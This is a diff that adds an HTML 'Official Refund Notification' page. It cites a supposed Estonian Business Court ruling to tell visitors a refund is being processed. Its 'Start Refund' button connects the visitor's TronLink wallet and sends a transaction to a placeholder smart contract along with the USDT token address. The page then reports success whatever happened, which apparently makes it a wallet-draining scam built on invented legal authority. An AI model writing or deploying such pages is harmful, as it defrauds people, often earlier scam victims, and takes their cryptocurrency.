@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Official Refund (1284)</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 800px;
+      margin: 50px auto;
+      padding: 20px;
+      background-color: #f7f9fc;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h2 {
+      font-size: 20px;
+      line-height: 1.5;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 16px;
+      border: none;
+      background-color: #007bff;
+      color: white;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    #status {
+      margin-top: 20px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <h2>📢 Official Refund Notification</h2>
+  <p>
+    Following the decision of the <strong>Estonian Business Court</strong>, reference no. <strong>2025/EBT/1284</strong>, and under the supervision of the appointed notary, a refund is being processed for the funds you previously paid for various services.
+  </p>
+  <p>
+    This message serves as a <strong>digital signature and official notice</strong> confirming that the refund procedure is underway in accordance with the court ruling.
+  </p>
+  <p>
+    Any future claims or disputes must be addressed <strong>exclusively</strong> to the <strong>Estonian Business Court</strong>, in accordance with applicable legal procedures.
+  </p>
+
+  <button onclick="askRefund()">Start Refund</button>
+  <p id="status"></p>
+
+  <script>
+    const contractAddress = 'TON_ADRESSE_CONTRAT_DEPLOYE_ICI'; // 🔁 à remplacer par ton adresse de contrat
+    const usdtAddress = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj'; // Adresse USDT TRC20 officielle
+
+    async function askRefund() {
+      const status = document.getElementById('status');
+      status.innerText = '⏳ Please wait, your request is being processed...';
+
+      try {
+        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+          status.innerHTML = '❌ TronLink not connected. <a href="https://www.tronlink.org/" target="_blank">Install TronLink</a>.';
+          return;
+        }
+
+        const contract = await tronWeb.contract().at(contractAddress);
+        const tx = await contract.askRefund(usdtAddress).send();
+
+        status.innerText = '🎉 Success! Your refund request has been accepted.';
+        console.log('Transaction Hash:', tx);
+      } catch (err) {
+        console.error(err);
+        status.innerText = '❌ Refund request failed. Please try again later.';
+      }
+    }
+  </script>
+</body>
+</html>
